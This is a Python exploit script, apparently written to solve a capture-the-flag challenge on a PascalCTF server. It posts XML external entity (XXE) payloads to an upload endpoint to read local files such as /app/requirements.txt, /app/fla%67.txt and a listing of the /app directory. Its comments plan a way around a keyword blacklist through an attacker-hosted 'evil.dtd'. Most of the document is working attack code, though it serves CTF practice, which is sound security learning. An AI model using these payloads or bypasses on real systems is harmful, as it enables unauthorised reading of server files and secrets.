import requests
import base64

BASE_URL = "https://pdfile.ctf.pascalctf.it"

# The blacklist blocks: flag, etc, sh, bash, proc, pascal, tmp, env, exec, file
# And blocks &#
# But we can use external parameter entities to bypass!

# Method 1: Use an external DTD hosted somewhere to include the flag
# Method 2: Use path tricks to avoid "flag" in the path

# Let's try using /app/fla followed by entity for 'g.txt'
# Or we can try using a data URI or other tricks

# Actually, the simplest bypass: use globbing or alternative paths
# /app/flag.txt can be accessed via /app/./././flag.txt? No, still contains 'flag'

# Let's try using external entity with base64 encoding via php://filter
# But this is Python, not PHP...

# The key insight: we can use an EXTERNAL DTD file that contains the blocked words!
# The blacklist only checks the uploaded XML content, not the external DTD

# For local testing, let's try various bypasses:

# Method: Use UTF-16 encoding - the sanitize function tries UTF-8 first
# If we use UTF-16, the decode might fail and we could bypass... but it returns False on decode error

# Method: Use external DTD with SYSTEM "http://our-server/evil.dtd"
# The evil.dtd contains the parameter entity definitions with "flag" in them

# Let's try a simpler approach first - parameter entities for string concatenation
# <!ENTITY % a "fla">
# <!ENTITY % b "g.txt">
# Then reference them

# Actually wait - looking at the code again:
# The sanitize runs BEFORE parsing, so we need the uploaded content to not contain blocked words
# But external DTDs are fetched DURING parsing

# So the attack is:
# 1. Our .pasx file references an external DTD 
# 2. The DTD (not checked by blacklist) defines entities that read /app/flag.txt
# 3. Those entities are expanded into the PDF content

# For this, we need to host a malicious DTD file
# But let's first check if we can use data: URIs

# Actually, let's try a different approach - use file:// with path normalization
# /app/f%6Cag.txt - URL encoding in file:// URI might work

# Or use double URL encoding tricks

# Let's try the external DTD approach with a webhook
# Using webhook.site or similar

# Simple test first - does basic XXE work without blocked words?
pasx_test = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/requirements.txt">
]>
<book>
  <title>&xxe;</title>
  <author>Test Author</author>
  <year>2024</year>
  <isbn>1234567890</isbn>
  <chapters>
    <chapter number="1">
      <title>Chapter One</title>
      <content>This is test content.</content>
    </chapter>
  </chapters>
</book>'''

print("Testing basic XXE with requirements.txt...")
files = {'file': ('test.pasx', pasx_test, 'application/xml')}
r = requests.post(f"{BASE_URL}/upload", files=files)
print(r.text)
print()

# If that works, we need to bypass the "flag" filter
# External DTD approach:
# Host this DTD on a server: <!ENTITY xxe SYSTEM "file:///app/flag.txt">
# Our XML references: <!ENTITY % dtd SYSTEM "http://our-server/evil.dtd"> %dtd;

# For now, let's try different path tricks
# What about /app/./fla + entity tricks within allowed chars?

# Actually - the filter is CASE SENSITIVE check but uses .lower()
# So FLAG, Flag etc all get caught

# Let me try using different encodings in the file:// URI itself
# file:///app/fla%67.txt - URL encoded 'g'

pasx_urlenc = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "file:///app/fla%67.txt">
]>
<book>
  <title>&xxe;</title>
  <author>Test Author</author>
  <year>2024</year>
  <isbn>1234567890</isbn>
  <chapters>
    <chapter number="1">
      <title>Chapter One</title>
      <content>This is test content.</content>
    </chapter>
  </chapters>
</book>'''

print("Testing XXE with URL-encoded path...")
files = {'file': ('test.pasx', pasx_urlenc, 'application/xml')}
r = requests.post(f"{BASE_URL}/upload", files=files)
print(r.text)
print()

# The "file" keyword is blocked. Let's try without file:// scheme
# SYSTEM "/app/..." should work as a local file path

pasx_localpath = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/fla%67.txt">
]>
<book>
  <title>&xxe;</title>
  <author>Test Author</author>
  <year>2024</year>
  <isbn>1234567890</isbn>
  <chapters>
    <chapter number="1">
      <title>Chapter One</title>
      <content>This is test content.</content>
    </chapter>
  </chapters>
</book>'''

print("Testing XXE with local path (URL encoded g)...")
files = {'file': ('test.pasx', pasx_localpath, 'application/xml')}
r = requests.post(f"{BASE_URL}/upload", files=files)
print(r.text)
print()

# Try with UTF-8 encoded char
# 'g' = 0x67
# Let's try various path tricks

# What about symlinks or /dev/fd tricks?

# Try reading /app directory listing first to see what files exist
pasx_ls = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/">
]>
<book>
  <title>&xxe;</title>
  <author>Test Author</author>
  <year>2024</year>
  <isbn>1234567890</isbn>
  <chapters>
    <chapter number="1">
      <title>Chapter One</title>
      <content>Content here</content>
    </chapter>
  </chapters>
</book>'''

print("Testing directory listing /app/...")
files = {'file': ('test.pasx', pasx_ls, 'application/xml')}
r = requests.post(f"{BASE_URL}/upload", files=files)
print(r.text)
